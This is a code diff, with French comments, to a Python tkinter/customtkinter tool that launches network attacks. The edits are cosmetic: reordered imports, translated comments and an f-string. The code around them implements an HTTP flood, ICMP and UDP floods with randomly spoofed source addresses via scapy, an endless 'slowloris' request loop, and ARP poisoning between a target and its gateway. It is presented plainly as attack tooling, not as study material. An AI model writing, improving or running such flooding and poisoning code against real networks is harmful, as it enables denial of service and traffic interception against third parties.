@@ -1,21 +1,21 @@
-import tkinter as tk
-from tkinter import messagebox
-import customtkinter as ctk
 import threading  # Importation de threading pour exécuter l'attaque dans un thread séparé
 import requests  # Pour l'attaque HTTP Flood
 from scapy.all import IP, ICMP, TCP, UDP, send, ARP, srp, Ether
 import random
 import time
 import socket
+import tkinter as tk
+from tkinter import messagebox
+import customtkinter as ctk
 
-# Fonction pour HTTP Flood Attack (corrigée)
+# Fonction pour HTTP Flood Attack
 def http_flood(target_ip, target_port, count, log_display):
-    http_request = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
+    http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
     for _ in range(count):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target_ip, target_port))  # Connexion au serveur
-            sock.send(http_request.encode())  # Envoie la requête HTTP
+            sock.send(http_request.encode())  # Envoi de la requête HTTP
             log_display.insert(tk.END, f"HTTP Flood request sent to {target_ip}:{target_port}\n")
             sock.close()
         except Exception as e:
@@ -26,7 +26,7 @@ def icmp_flood_attack(target_ip, packet_count, log_display):
     for _ in range(packet_count):
         ip_layer = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
         icmp_layer = ICMP()
-        payload = b"X" * random.randint(10, 50)  # Random payload size
+        payload = b"X" * random.randint(10, 50)  # Taille aléatoire du payload
         packet = ip_layer / icmp_layer / payload
         send(packet, verbose=0)
         log_display.insert(tk.END, f"ICMP packet sent to {target_ip}\n")
@@ -45,7 +45,7 @@ def udp_flood_attack(target_ip, target_port, packet_count, log_display):
     for _ in range(packet_count):
         ip_layer = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
         udp_layer = UDP(sport=random.randint(1024, 65535), dport=target_port)
-        payload = b"X" * random.randint(10, 50)  # Random payload size
+        payload = b"X" * random.randint(10, 50)  # Taille aléatoire du payload
         packet = ip_layer / udp_layer / payload
         send(packet, verbose=0)
         log_display.insert(tk.END, f"UDP packet sent to {target_ip}:{target_port}\n")
@@ -55,7 +55,6 @@ def slowloris_attack(target_ip, target_port, log_display):
     url = f"http://{target_ip}:{target_port}"  # Construire l'URL cible
     while True:
         try:
-            # Envoi d'un entête HTTP incomplet pour garder la connexion ouverte
             headers = {'Connection': 'keep-alive'}
             response = requests.get(url, headers=headers, timeout=2)
             log_display.insert(tk.END, f"Slowloris attack sent to {url}\n")
@@ -67,7 +66,7 @@ def slowloris_attack(target_ip, target_port, log_display):
 def arp_poisoning_attack(target_ip, gateway_ip, log_display):
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
-    
+
     if target_mac is None or gateway_mac is None:
         log_display.insert(tk.END, "MAC address not found for ARP Poisoning.\n")
         return
@@ -187,4 +186,3 @@ log_display.pack(pady=10)
 
 # Lancer l'application
 app.mainloop()
-
